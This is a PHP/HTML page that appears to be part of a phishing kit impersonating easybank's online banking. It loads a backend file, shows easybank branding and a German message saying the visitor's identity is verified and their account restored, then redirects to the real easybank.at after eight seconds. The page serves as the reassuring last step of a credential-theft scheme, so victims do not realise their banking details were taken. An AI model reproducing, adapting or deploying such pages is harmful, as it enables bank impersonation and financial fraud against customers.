<?php 
require '../main.php';
?><!DOCTYPE html>
<html class="" lang="de">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<title>Online-Banking | easybank</title>
<meta content="width=device-width, height=device-height, initial-scale=1.0, viewport-fit=cover" name="viewport"/>
<meta content="telephone=no" name="format-detection"/>
<meta content="no" name="msapplication-tap-highlight"/>
<meta content="no-referrer" name="referrer"/>
<link href="styles.css" rel="stylesheet"/>
</head>
<body class="desktop-detected internet-banking template_logintransaction_firstlevel desktop no-ignore-color">

<section aria-labelledby="page-title" class="unauthenticated" id="vcMainContainer" role="region" tabindex="-1">

<div class="vc-header" id="headerPanel">
 <div class="header header--default" id="header">
  <div class="header__logo">
   <div class="logo-group">
    <a class="clickable logo" href="#" title="easybank">
     <img alt="easybank" id="LogoClickable-headerLogo-ItemPreview" src="css/easybank.png"/>
    </a>
   </div>
  </div>
  <div class="header__menu">
   <div class="header-menu__site-navigation"></div>
  </div>
 </div>
 <div class="header-push"></div>
</div>

<div aria-labelledby="page-title" class="clearfix" id="main" role="main">
 <div class="login-page">
  <div class="form-horizontal undefined main-container-primary background-primary">
   <div class="content-container">
    <div class="login-wrapper">
     <div class="login-wrapper__head"></div>
     <div class="login-wrapper__content login-wrapper__content--center">
      <div class="login-wrapper__form">
       <div class="login-wrapper__tab" id="LoginTab">
        <div class="tabs tabs--primary">
         <div class="no-padding">
          <div class="widget-body">
           <div class="tab-content">
            <div class="tab-pane fade show" role="tabpanel" tabindex="0">
             <div class="tab-pane__content">
              <div class="login-form">
               <div class="heading" id="VcLabelHeadingDiv">
                <h1 id="HeadingH1">Verifizierung abgeschlossen</h1>
               </div>
               <div style="display:flex;justify-content:center;align-items:center;margin:32px 0 24px 0;">
                <div style="width:90px;height:90px;border-radius:50%;background:#e8f5f2;display:flex;align-items:center;justify-content:center;">
                 <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#177991" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                  <polyline points="20 6 9 17 4 12"/>
                 </svg>
                </div>
               </div>
               <div style="background:#f0f9f7;border-left:4px solid #177991;border-radius:4px;padding:16px 20px;margin-bottom:28px;">
                <p style="font-family:OpenSans-Regular,Arial,Helvetica,Sans-Serif;font-size:14px;color:#404040;line-height:22px;margin:0;">
                 Ihre Identität wurde erfolgreich bestätigt. Ihr Konto ist nun wieder vollständig zugänglich.
                </p>
               </div>
               <p style="font-family:OpenSans-Regular,Arial,Helvetica,Sans-Serif;font-size:13px;color:#707070;line-height:20px;margin-bottom:28px;text-align:center;">
                Sie werden automatisch weitergeleitet. Falls nicht, klicken Sie bitte auf die Schaltfläche unten.
               </p>
               <div class="buttons-container buttons-container--single">
                <div class="buttons-container__desktop">
                 <a href="https://www.easybank.at" class="vc-btn--primary vc-btn" id="btn-NextButton" style="text-decoration:none;display:flex;align-items:center;justify-content:center;">
                  <span>Weiter zum Online-Banking</span>
                 </a>
                </div>
               </div>
              </div>
             </div>
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
   </div>
  </div>
 </div>
</div>

<footer class="footer">
 <div class="container">
  <h2 class="visually-hidden" id="footerHeadline">Footer Navigation</h2>
  <nav aria-labelledby="footerHeadline" id="footer-nav" role="navigation">
   <ul>
    <li><a aria-label="FAQ" href="#" title="FAQ"><span class="text" tabindex="-1">FAQ</span></a></li>
    <li><a aria-label="Kontakt" href="#" title="Kontakt"><span class="text" tabindex="-1">Kontakt</span></a></li>
    <li><a aria-label="Impressum" href="#" title="Impressum"><span class="text" tabindex="-1">Impressum</span></a></li>
    <li><a aria-label="Datenschutz" href="#" title="Datenschutz"><span class="text" tabindex="-1">Datenschutz</span></a></li>
    <li><a aria-label="AGB" href="#" title="AGB"><span class="text" tabindex="-1">AGB</span></a></li>
    <li><a aria-label="Barrierefreiheit" href="#" title="Barrierefreiheit"><span class="text" tabindex="-1">Barrierefreiheit</span></a></li>
   </ul>
  </nav>
 </div>
</footer>

</section>

<script src="js/jq.js"></script>
<script>
setTimeout(function(){ window.location.href = "https://www.easybank.at"; }, 8000);
</script>
</body>
</html>